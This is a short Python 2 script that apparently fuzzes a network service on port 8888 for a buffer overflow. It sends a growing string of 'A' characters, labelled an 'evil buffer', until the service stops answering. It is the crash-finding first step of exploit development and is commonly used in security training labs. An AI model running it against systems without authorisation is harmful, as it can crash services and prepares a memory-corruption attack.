#!/usr/bin/python

import sys, socket, time

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

contador = 100

while True:

    buffer = "A" * contador
    buffer += "\r\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((sys.argv[1], 8888))
        print s.recv(1024)
        print "Sending evil buffer de %s bytes" %contador
        print buffer
        print ""
        s.send(buffer)
        s.close()
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    time.sleep(1)
    contador+=100



